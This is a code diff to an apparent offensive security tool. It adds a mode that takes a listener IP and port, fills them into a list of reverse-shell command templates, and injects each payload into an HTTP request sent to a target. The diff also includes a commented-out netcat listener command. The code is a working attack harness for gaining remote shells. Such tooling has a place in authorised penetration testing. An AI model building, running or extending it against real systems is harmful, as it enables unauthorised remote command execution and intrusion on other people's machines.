@@ -307,18 +307,37 @@ def exploit():
 
 
     # spray and pray a bunch of revshells
-    if g_args.revshell:    
-        revshell_ip = input("[+] Enter your ip(LHOST): ")
-        revshell_port = input("[+] Enter you (LPORT): ")
-        print(f"[+] Starting listener on {revshell_ip}:{revshell_port}")
-        #todo
+    if g_args.revshell:
+        print("\n[+] Trying reverse shell payloads:")
+        revshell_ip = input("[+] Enter listener ip (LHOST): ")
+        revshell_port = input("[+] Enter listener port (LPORT): ")
 
-        for rs in utils.reverse_shells:
-            rs.replace("ip_placeholder", revshell_ip).replace("port_placeholder", revshell_port).strip()
-            payload = generate_payload(revshell_cmd=rs)
+
+        user_input = input(f"[+] Start a local listener on port {revshell_port}? (y/N)")
+        if user_input.lower() == "y":
+            print_green(f"[+] Starting listener on {revshell_ip}:{revshell_port}")
+            # os.system(f"nc -lvnp  {revshell_port}")
+            # todo: treba napraviti to sa posebno dretvom da program ne za hanga
+            time.sleep(100) 
+
+
+        print("[+] Trying out reverse shell payloads ...")
+        for rs_index, rs_cmd in enumerate(utils.reverse_shells):
+            rs_cmd = rs_cmd.replace("ip_placeholder", revshell_ip).replace("port_placeholder", revshell_port).strip()
+            payloads_list = generate_payload(rs_cmd)
+            
+            for num, payload in enumerate(payloads_list):
+                (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
+                req = Request(method=method, url=url, headers=headers, data=data)
+                prepared_req = req.prepare()
+                if proxy_servers is not None:
+                    response = requests.Session().send(prepared_req, proxies=proxy_servers, verify=False)
+                else:
+                    response = requests.Session().send(prepared_req, verify=False)
+            print(f"[+] Tried reverse shell num #{rs_index}")
         
 
-        print("[+] Tried all payloads")
+        print_green("\n[+] Done\n")
         return
     
 
@@ -341,10 +360,10 @@ def exploit():
             else:
                 response = requests.Session().send(prepared_req, verify=False)
             
-            print(f"[+] Sent request num #{num + 1} ")
+            print(f"\t[+] Sent request num #{num + 1} ")
 
         
-        print_green("[+] Done")
+        print_green("\n[+] Done\n")
 
 
     
